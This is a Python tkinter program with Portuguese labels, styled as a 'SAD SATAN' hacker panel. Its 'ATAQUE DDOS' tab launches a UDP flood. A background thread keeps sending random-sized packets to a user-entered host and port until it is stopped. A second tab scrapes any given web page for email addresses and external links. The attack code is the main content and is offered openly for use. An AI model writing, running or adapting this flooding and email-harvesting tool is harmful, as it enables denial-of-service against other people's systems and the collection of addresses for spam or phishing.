import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import threading
import time
import requests
from bs4 import BeautifulSoup
import re
import socket
import random

# Flag global para controle do ataque
is_attacking = False

class SadSatanPanel:
    def __init__(self, root):
        self.root = root
        self.root.title("SAD SATAN - Painel Definitivo")
        self.root.geometry("900x650")
        self.root.configure(bg="#0a0a0a") 
        
        # Estilo Dark Mode / Hacker
        style = ttk.Style()
        style.theme_use('clam')
        style.configure("TButton", background="#8b0000", foreground="white", font=("Courier New", 10, "bold"))
        style.map("TButton", background=[('active', '#ff0000')])
        
        # Título com ASCII Art
        ascii_art = """
   .       .   .      .  *  .          .       .       .
.        .    * .         .        .   .     .  .     .
  .             .       .     .       .  *   .     .
*       .           .       .   .     .   .    *  .
  .    .   .    .     .       *       .    .  *   .
 .  *       .     .    .  *  .    .    .  *  .   .
   .  *  .    .  *  .    .    .  *  .    .    .  *
"""
        title_label = tk.Label(root, text=ascii_art + "\n  S A D   S A T A N  \n" + ascii_art[::-1], 
                               bg="#0a0a0a", fg="#ff0000", font=("Courier New", 10))
        title_label.pack(pady=5)

        # Abas do Painel
        self.notebook = ttk.Notebook(root)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # --- ABA 1: ATAQUE DDOS ---
        self.tab_attack = ttk.Frame(self.notebook)
        self.notebook.add(self.tab_attack, text="1. ATAQUE DDOS")
        
        ttk.Label(self.tab_attack, text="Alvo (IP ou Domínio):", font=("Courier New", 10)).pack(pady=5)
        self.target_entry = ttk.Entry(self.tab_attack, width=50)
        self.target_entry.insert(0, "127.0.0.1") 
        self.target_entry.pack(pady=5)
        
        ttk.Label(self.tab_attack, text="Porta:", font=("Courier New", 10)).pack(pady=5)
        self.port_entry = ttk.Entry(self.tab_attack, width=50)
        self.port_entry.insert(0, "80")
        self.port_entry.pack(pady=5)
        
        ttk.Button(self.tab_attack, text="INICIAR UDP FLOOD", command=self.start_ddos).pack(pady=10)
        ttk.Button(self.tab_attack, text="PARAR ATAQUE", command=self.stop_ddos).pack(pady=5)

        # --- ABA 2: COLETA DE DADOS ---
        self.tab_scrape = ttk.Frame(self.notebook)
        self.notebook.add(self.tab_scrape, text="2. COLETA DE DADOS")
        
        ttk.Label(self.tab_scrape, text="URL do Site:", font=("Courier New", 10)).pack(pady=5)
        self.url_entry = ttk.Entry(self.tab_scrape, width=60)
        self.url_entry.insert(0, "https://google.com")
        self.url_entry.pack(pady=5)
        
        ttk.Button(self.tab_scrape, text="COLETAR EMAILS E LINKS", command=self.start_scraping).pack(pady=10)
        
        self.scrape_results = scrolledtext.ScrolledText(self.tab_scrape, width=70, height=15, bg="#000000", fg="#00ff00", font=("Courier New", 9))
        self.scrape_results.pack(pady=10)

        # --- ABA 3: LOGS GERAIS ---
        self.tab_logs = ttk.Frame(self.notebook)
        self.notebook.add(self.tab_logs, text="3. LOGS & STATUS")
        
        self.log_area = scrolledtext.ScrolledText(self.tab_logs, width=90, height=25, bg="#000000", fg="#ff0000", font=("Courier New", 9))
        self.log_area.pack(pady=10, fill=tk.BOTH, expand=True)

        # Rodapé com Status
        self.status_var = tk.StringVar()
        self.status_var.set("Status: Sistema Pronto")
        status_label = ttk.Label(root, textvariable=self.status_var, foreground="#ff0000", font=("Courier New", 10))
        status_label.pack(side=tk.BOTTOM, fill=tk.X, padx=10, pady=5)

    def log(self, message):
        self.log_area.config(state=tk.NORMAL)
        self.log_area.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {message}\n")
        self.log_area.see(tk.END)
        self.log_area.config(state=tk.DISABLED)

    # --- LÓGICA DE ATAQUE ---
    def start_ddos(self):
        global is_attacking
        target = self.target_entry.get()
        port = int(self.port_entry.get())
        if not target:
            self.log("Erro: Alvo não especificado.")
            return
        
        if is_attacking:
            self.log("Ataque já em andamento!")
            return

        is_attacking = True
        self.status_var.set("Status: Atacando...")
        self.log(f"Iniciando UDP Flood contra {target}:{port}")
        
        thread = threading.Thread(target=self.run_ddos, args=(target, port), daemon=True)
        thread.start()

    def run_ddos(self, target, port):
        try:
            while is_attacking:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                payload = b'\x00' * random.randint(100, 1000)
                try:
                    sock.sendto(payload, (target, port))
                except Exception:
                    pass
                sock.close()
                time.sleep(0.01) # Pequeno delay para eficiência
            self.log("Ataque finalizado pelo usuário.")
        except Exception as e:
            self.log(f"Erro no ataque: {e}")
        finally:
            self.check_stop()

    def stop_ddos(self):
        global is_attacking
        is_attacking = False
        self.log("Sinal de parada enviado...")
        self.status_var.set("Status: Aguardando encerramento...")

    def check_stop(self):
        # Verifica se ainda deve atacar
        if is_attacking:
            self.root.after(100, self.check_stop)
        else:
            self.status_var.set("Status: Aguardando...")

    # --- LÓGICA DE SCRAPING ---
    def start_scraping(self):
        url = self.url_entry.get()
        if not url:
            self.log("Erro: URL não especificada.")
            return
        
        self.status_var.set("Status: Coletando dados...")
        self.log(f"Coletando dados de: {url}")
        
        thread = threading.Thread(target=self.run_scraping, args=(url,), daemon=True)
        thread.start()

    def run_scraping(self, url):
        try:
            response = requests.get(url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            emails = set(re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', response.text))
            links = set([link['href'] for link in soup.find_all('a', href=True) if link['href'].startswith('http')])
            
            output = f"\n--- Resultados de {url} ---\n\nEMAILS:\n" + "\n".join(list(emails)[:20]) + "\n\nLINKS EXTERNOS:\n" + "\n".join(list(links)[:20])
            
            self.scrape_results.config(state=tk.NORMAL)
            self.scrape_results.delete(1.0, tk.END)
            self.scrape_results.insert(tk.END, output)
            self.scrape_results.config(state=tk.DISABLED)
            
            self.log(f"Dados coletados com sucesso!")
        except Exception as e:
            self.log(f"Erro na coleta: {e}")
        finally:
            self.status_var.set("Status: Aguardando...")

if __name__ == "__main__":
    root = tk.Tk()
    app = SadSatanPanel(root)
    
    # Tentativa de carregar imagem 'satan.png' se existir
    try:
        from PIL import Image, ImageTk
        img = Image.open("satan.png")
        img = img.resize((100, 100), Image.LANCZOS)
        photo = ImageTk.PhotoImage(img)
        label_img = tk.Label(app.tab_logs, image=photo, bg="#0a0a0a")
        label_img.image = photo 
        label_img.pack(pady=5)
    except:
        pass

    root.mainloop()